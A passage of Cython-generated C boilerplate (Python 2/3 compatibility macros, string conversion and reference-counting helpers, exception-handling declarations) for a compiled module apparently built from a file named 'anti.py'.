#if PY_MAJOR_VERSION >= 3
#define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
#ifndef PyUnicode_InternFromString
#define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
#endif
#endif
#if PY_VERSION_HEX < 0x030200A4
typedef long Py_hash_t;
#define __Pyx_PyInt_FromHash_t PyInt_FromLong
#define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
#define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
#define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
#define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
#if PY_VERSION_HEX >= 0x030500B1
#define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
#define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
#else
#define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
#endif
#else
#define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
typedef struct {
    unaryfunc am_await;
    unaryfunc am_aiter;
    unaryfunc am_anext;
} __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
#if !defined(_USE_MATH_DEFINES)
#define _USE_MATH_DEFINES
#endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
    float value;
    memset(&value, 0xFF, sizeof(value));
    return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
#ifdef __cplusplus
#define __PYX_EXTERN_C extern "C"
#else
#define __PYX_EXTERN_C extern
#endif
#endif

#define __PYX_HAVE__anti
#define __PYX_HAVE_API__anti
#ifdef _OPENMP
#include <omp.h>
#endif

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {
    PyObject** p; const char* s; const Py_ssize_t n; const char* encoding;
    const char is_unicode; const char is_str; const char intern;
} __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t)i < (size_t)limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
#include <cstdlib>
#define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
#define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
#define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
#define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
#define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
#define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
#define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
#define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
#define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
#define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
#define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE* u) {
    const Py_UNICODE* u_end = u;
    while (*u_end++);
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject* __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*)"getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    }
    else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*)(const char*)"getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*)malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
#define likely(x)   __builtin_expect(!!(x), 1)
#define unlikely(x) __builtin_expect(!!(x), 0)
#else
#define likely(x)   (x)
#define unlikely(x) (x)
#endif
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject* __pyx_m = NULL;
static PyObject* __pyx_d;
static PyObject* __pyx_b;
static PyObject* __pyx_cython_runtime = NULL;
static PyObject* __pyx_empty_tuple;
static PyObject* __pyx_empty_bytes;
static PyObject* __pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char* __pyx_cfilenm = __FILE__;
static const char* __pyx_filename;


static const char* __pyx_f[] = {
  "anti.py",
};
#ifndef CYTHON_REFNANNY
#define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
} __Pyx_RefNannyAPIStruct;
static __Pyx_RefNannyAPIStruct* __Pyx_RefNanny = NULL;
static __Pyx_RefNannyAPIStruct* __Pyx_RefNannyImportAPI(const char* modname);
#define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
#define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
#define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
#define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
#define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
#define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
#define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
#define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
#define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
#define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
#define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
#define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
#define __Pyx_RefNannyDeclarations
#define __Pyx_RefNannySetupContext(name, acquire_gil)
#define __Pyx_RefNannyFinishContext()
#define __Pyx_INCREF(r) Py_INCREF(r)
#define __Pyx_DECREF(r) Py_DECREF(r)
#define __Pyx_GOTREF(r)
#define __Pyx_GIVEREF(r)
#define __Pyx_XINCREF(r) Py_XINCREF(r)
#define __Pyx_XDECREF(r) Py_XDECREF(r)
#define __Pyx_XGOTREF(r)
#define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif
static PyObject* __Pyx_GetBuiltinName(PyObject* name);
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject* obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject* obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
#define __Pyx_GetModuleGlobalNameUncached(var, name)  {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
static PyObject* __Pyx__GetModuleGlobalName(PyObject* name, PY_UINT64_T* dict_version, PyObject** dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject* __Pyx__GetModuleGlobalName(PyObject* name);
#endif
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject* __Pyx_PyFunction_FastCallDict(PyObject* func, PyObject** args, Py_ssize_t nargs, PyObject* kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
static size_t __pyx_pyframe_localsplus_offset = 0;
#include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
#ifndef Py_BUILD_CORE
#define Py_BUILD_CORE 1
#endif
#include "internal/pycore_frame.h"
#endif
#define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
#define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject* func, PyObject* arg, PyObject* kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject* func, PyObject* arg);
#endif
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject* func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject* __Pyx_PyCFunction_FastCall(PyObject* func, PyObject** args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject* func, PyObject* arg);
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem* __Pyx_PyErr_GetTopmostException(PyThreadState* tstate);
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState* tstate, PyObject* type, PyObject* value, PyObject* tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb);
#else
static int __Pyx_GetException(PyObject** type, PyObject** value, PyObject** tb);
#endif
static CYTHON_INLINE PyObject* __Pyx_GetAttr(PyObject*, PyObject*);
static CYTHON_INLINE int __Pyx_HasAttr(PyObject*, PyObject*);
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);
static int __Pyx_ParseOptionalKeywords(PyObject* kwds, PyObject** argnames[], \
    PyObject* kwds2, PyObject* values[], Py_ssize_t num_pos_args, \
    const char* function_name);
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState* tstate, PyObject* type, PyObject* value, PyObject* tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject* a, PyTypeObject* b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject* err, PyObject* type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject* err, PyObject* type1, PyObject* type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject* res;
    PyTypeObject* tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        }
        else {
            res = f(res, obj, (PyObject*)tp);
        }
    }
    else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif
static PyObject* __Pyx_Import(PyObject* name, PyObject* from_list, int level);
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject* __Pyx_GetItemInt_List_Fast(PyObject* o, Py_ssize_t i,
    int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject* __Pyx_GetItemInt_Tuple_Fast(PyObject* o, Py_ssize_t i,
    int wraparound, int boundscheck);
static PyObject* __Pyx_GetItemInt_Generic(PyObject* o, PyObject* j);
static CYTHON_INLINE PyObject* __Pyx_GetItemInt_Fast(PyObject* o, Py_ssize_t i,
    int is_list, int wraparound, int boundscheck);
#include <string.h>
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);
#if CYTHON_FAST_THREAD_STATE
